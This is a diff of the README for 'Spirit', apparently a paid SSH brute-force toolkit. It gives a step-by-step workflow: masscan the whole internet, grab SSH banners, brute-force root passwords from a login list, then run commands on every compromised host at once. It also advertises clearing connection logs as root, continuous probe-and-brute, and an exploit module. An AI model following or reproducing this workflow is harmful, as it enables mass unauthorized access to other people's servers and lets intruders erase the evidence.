@@ -2,9 +2,10 @@
 
 ### [Download the latest Spirit release](https://github.com/theaog/spirit/releases)
 
-> Check out the helpfile [`$ ./spirit --help`](./HELP) to see the whole set of tools.
+> [`$ ./spirit --help`](./HELP) shows you all the included tools commands. \
+some commands have subcommands `./spirit <command> --help`
 
-## Example usage for SSH brute
+## Example usage for SSH brute flow
 ```bash
 # First scan your network or the internet (check disclaimer) to acquire a list of open ports.
 $ masscan \
@@ -13,20 +14,24 @@ $ masscan \
     --exclude 255.255.255.255 \
     -oG open.lst
 Scanning 4294967295 hosts [4 ports/host]
-# You now have a masscan oG (output Greppable) formatted file.
+# Masscan will create an open.lst file in oG (output Greppable) format.
 
-# Parse open.lst so that it's usable w/ spirit.
+# Parse open.lst to format the data, so that spirit can understand it.
 $ ./spirit parse open.lst
 INFO created h.lst in HOST:PORT format
 # spirit created a HOST:PORT formatted h.lst file, you can provide your custom file name using the `--file` flag.
 
-# Now test these open ports if they're running SSH by grabbing banners.
+# Test these open ports if they're running SSH by grabbing banners.
+# Spirit includes custom designed SSH connection flow.
+# you can also auto-exclude bogus hosts using the --filter option.
 $ ./spirit banner
 SSH-2.0-OpenSSH_8.2p  13% [=>                  ] [11s:1m15s]
 INFO created b.lst in HOST:PORT:BANNER format
 # spirit created a `b.lst` file containing the hosts running SSH and their banner.
+head -n1 b.lst
+100.100.100.100:2222:SSH-2.0-OpenSSH_6.6.1
 
-# Move the banner output (b.lst) to h.lst so spirit will load it automatically.
+# Move the banner output (b.lst) to h.lst so spirit will load it automatically for bruting.
 $ mv b.lst h.lst
 
 # Add a password list, spirit will automatically load user:pass from a p.lst file.
@@ -43,12 +48,14 @@ INFO loaded p.lst with 4881 logins
 [2478/4653]root:!1qwerty [77]found [33]blocked [1284]threads 20% [====>               ] [20s:1h13m36s]
 $ less -S found.lst
 
-# Connect to all your vulnerable hosts automatically & run commands.
-# omni will automatically attempt to connect to hosts present in the found.lst file.
+# Connect to all your found hosts automatically & run commands.
+# omni will automatically attempt to connect to hosts present in the found.lst file,
+# run commands on them and display the output to you.
 $ ./spirit omni -c 'whoami && uptime'
 ```
 
-> Tip: you can automate these steps with `./spirit auto` or use the [`./go.sh`](./go.sh) script, if you have Pro license use `./spirit forever` for continuous automatic probing on random ports & bruting.
+> Tip: you can automate these steps with `./spirit auto` or use the [`./go.sh`](./go.sh) script. \
+If you have Pro license use `./spirit forever` for continuous automatic probing on random ports & bruting. ![forever](asset/forever.png)
 
 ## Upgrade Spirit automaticaly
 ```bash
@@ -78,11 +85,8 @@ Buy a Spirit Pro license directly from the CLI `./spirit buy`. Every license hel
 - clean connection logs (if uid0) using `./spirit zap`
 - masscan whole zones automatically at your own pace `./spirit masscan --zone zone.lst --rate 10_000`
 - continously scan & brute your network on random ports `./spirit forever` -- spot vulnerabilities before they happen
+- test targets for common local and remote exploits `./spirit exploit` (beta)
 - and more...
-
-> check out all the spirit tools! [`$ ./spirit --help`](./HELP)
-
-> every tool has it's own helpfile, e.g. `./spirit ms --help`
 
 # Support the Develpoment of the Spirit toolkit!
 ## Monero (XMR) thank you! (our favorite)
